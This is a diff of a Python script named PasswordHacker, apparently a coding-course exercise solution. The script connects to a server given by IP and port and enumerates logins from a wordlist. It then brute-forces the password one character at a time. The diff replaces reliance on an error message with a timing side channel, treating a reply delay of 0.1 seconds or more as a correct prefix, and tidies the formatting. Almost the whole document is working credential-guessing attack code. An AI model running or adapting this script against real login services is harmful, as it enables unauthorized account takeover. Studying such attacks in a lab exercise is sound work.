@@ -4,13 +4,13 @@ import itertools
 import string
 import os
 import json
+from datetime import datetime, timedelta
 
 
 class PasswordHacker:
 
     def __init__(self):
         self.get_params()
-
 
     def get_params(self):
         self.ip_address = sys.argv[1]
@@ -50,18 +50,18 @@ class PasswordHacker:
 
     @classmethod
     def pass_smart(cls):
-        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.txt"),'tr') as file_pass:
+        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.txt"), 'tr') as file_pass:
             for word in file_pass.readlines():
-                for i in itertools.product([0,1], repeat=len(word[:-1])):
-                    res = [letter.upper() if n==1 else letter.lower() for (n,letter) in zip(i,word[:-1])]
+                for i in itertools.product([0, 1], repeat=len(word[:-1])):
+                    res = [letter.upper() if n == 1 else letter.lower() for (n, letter) in zip(i, word[:-1])]
                     yield ''.join(res)
 
     def find_login_pass(self):
         with socket.socket() as hack_socket:
             hack_socket.connect((self.ip_address, self.port))
-            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "logins.txt"),'tr') as file_login:
+            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "logins.txt"), 'tr') as file_login:
                 for word in file_login.readlines():
-                    try_login = {'login' : word[:-1], 'password' : ' '}
+                    try_login = {'login': word[:-1], 'password': ' '}
                     mess_json = json.dumps(try_login)
                     hack_socket.send(mess_json.encode())
                     response_raw = hack_socket.recv(1024)
@@ -69,7 +69,6 @@ class PasswordHacker:
                     response_json = json.loads(response)
                     if response_json['result'] == 'Wrong password!':
                         login = try_login['login']
-                        #print(login)
                         break
                 else:
                     login = None
@@ -78,30 +77,29 @@ class PasswordHacker:
                 pass_candidate = ''
                 letter_number = string.ascii_lowercase + string.ascii_uppercase + string.digits
                 while True:
-                    for i in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
+                    for i in letter_number:
                         pass_candidate += i
-                        try_login = {'login' : login, 'password' : pass_candidate}
+                        try_login = {'login': login, 'password': pass_candidate}
                         mess_json = json.dumps(try_login)
+                        start = datetime.now()
                         hack_socket.send(mess_json.encode())
                         response_raw = hack_socket.recv(1024)
+                        finish = datetime.now()
+                        difference = finish - start
                         response = response_raw.decode()
                         response_json = json.loads(response)
                         if response_json['result'] == 'Connection success!':
                             print(json.dumps(try_login))
                             exit()
-                        elif response_json['result'] == 'Exception happened during login':
-                            #print(pass_candidate)
+                        elif difference >= timedelta(seconds=0.1):
+                            # print(pass_candidate)
                             break
                         else:
                             pass_candidate = pass_candidate[:-1]
 
 
-
-
-
 hack = PasswordHacker()
-#hack.find_password(PasswordHacker.pass_brute())
+# hack.find_password(PasswordHacker.pass_brute())
 # hack.show_response()
-#hack.find_password((PasswordHacker.pass_smart))
+# hack.find_password((PasswordHacker.pass_smart))
 hack.find_login_pass()
-
